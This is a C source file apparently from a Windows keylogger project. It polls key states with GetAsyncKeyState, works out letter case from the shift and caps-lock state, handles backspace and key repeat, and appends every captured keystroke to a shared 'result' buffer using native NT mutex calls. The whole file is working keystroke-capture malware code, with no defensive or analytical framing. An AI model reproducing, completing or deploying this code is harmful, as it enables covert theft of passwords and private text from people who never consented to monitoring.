#include <time.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include "utils/common/utils.h"
#include "keylogger/keylogger.h"
#include "utils/mutex/mutex-handler.h"


int uuidLen = 32;
double initialDelay = 0.5;
double repeatDelay = 0.5;  // consider fewer?
int retries = 0;


void start(PressedKeys* pressedKeys, Keys* keys, KeysCombinations* combinations, Set* set, HANDLE hMutex) {
    char combination;
    char letter;

    while (1) {
        freeSetEntries(set);
        for (int i = 0; i < 100; i++) {
            Entry *entry = keys->entries[i];
            while (entry != NULL) {
                if ((GetAsyncKeyState(entry->value) & 0x8000) && (GetAsyncKeyState(0x10) & 0x8000)) {
                    if (isdigit((unsigned char)entry->key[0]) || containsChar(entry->key) == 1) {
                        combination = searchCombination(combinations, entry->key);
                        if (!triggerInvoked(&combination, set, pressedKeys, hMutex)) return;
                    } else if (isalpha((unsigned char)entry->key[0])) {
                        letter = GetKeyState(0x14) & 0x0001 ? tolower(*entry->key) : toupper(*entry->key);
                        if (!triggerInvoked(&letter, set, pressedKeys, hMutex)) return;
                    }
                } else if (GetAsyncKeyState(entry->value) & 0x8000) {
                    if (isdigit((char)entry->key[0])) {
                        if (!triggerInvoked(entry->key, set, pressedKeys, hMutex)) return;
                    } else if (isalpha((unsigned char)entry->key[0]) && strcmp(entry->key, "CAPS_LOCK") != 0 && strcmp(entry->key, "NUM_LOCK") != 0 && strcmp(entry->key, "BACK_SPACE") != 0) {
                        letter = GetKeyState(0x14) & 0x0001 ? toupper(*entry->key) : tolower(*entry->key);
                        if (!triggerInvoked(&letter, set, pressedKeys, hMutex)) return;
                    } else {
                        if (strcmp(entry->key, "CAPS_LOCK") == 0 || strcmp(entry->key, "NUM_LOCK") == 0) {
                            verifySpecialKeyState(entry->key, pressedKeys, set);
                        } else if (strcmp(entry->key, "BACK_SPACE") == 0) {
                            if (!backspaceClick(entry->key, set, pressedKeys, hMutex)) return;
                        } else {
                            if (!triggerInvoked(entry->key, set, pressedKeys, hMutex)) return;
                        }
                    }
                }
                entry = entry->next;
            }
        }
        /**
         * @brief Synchronizes the persistent record of pressed keys with the keys actually detected this cycle.
         *
         * After each iteration, the temporary `set` holds all keys seen in the current scan.
         * This loop:
         *   1. Iterates over every entry in `pressedKeys`.
         *   2. Checks whether each key still appears in `set`.
         *   3. Removes any key from `pressedKeys` that is not in `set`, since it has been released.
         */
        for (int i = 0; i < PRESSED_KEYS_SIZE; i++) {
            PressedEntry *entry = pressedKeys->entries[i];
            while (entry != NULL) {
                // `contains` returns 0 only if entry->key is not present within set, otherwise returns 1
                if (contains(set, entry->key) == 0) {
                    deletePK(pressedKeys, entry->key);
                }
                entry = entry->next;
            }  
        }
        Sleep(100);
    }
}

void verifySpecialKeyState(const char *keyName, PressedKeys *pressedKeys, Set* set) {
    add(set, keyName);
    if (searchPK(pressedKeys, keyName) == -1) {
        insertPK(pressedKeys, keyName, 999);
    }
}

BOOL triggerInvoked(const char *keyName, Set *set, PressedKeys *pressedKeys, HANDLE hMutex) {
    time_t now = time(NULL);
    int nextTriggerTime = searchPK(pressedKeys, keyName);
    add(set, keyName);

    if (nextTriggerTime == -1 || now >= nextTriggerTime) {
        if (NtWaitForSingleObject(hMutex, FALSE, NULL) != STATUS_SUCCESS) return FALSE;
        strcat(result, keyName);
        if (NtReleaseMutant(hMutex, NULL) != STATUS_SUCCESS) return FALSE;
        time_t delay = (nextTriggerTime == -1) ? initialDelay : repeatDelay;
        insertPK(pressedKeys, keyName, now + delay);
    }
    return TRUE;
}

BOOL backspaceClick(const char *keyName, Set *set, PressedKeys *pressedKeys, HANDLE hMutex) {
    time_t now = time(NULL);
    int nextTriggerTime = searchPK(pressedKeys, keyName);
    add(set, keyName);

    if (nextTriggerTime == -1 || now >= nextTriggerTime) {

        lockMutex(hMutex);
        size_t len = strlen(result);
        if (len > 0) result[len - 1] = '\0';
        unlockMutex(hMutex);

        time_t delay = (nextTriggerTime == -1) ? initialDelay : repeatDelay;
        insertPK(pressedKeys, keyName, now + delay);
    }
    return TRUE;
}
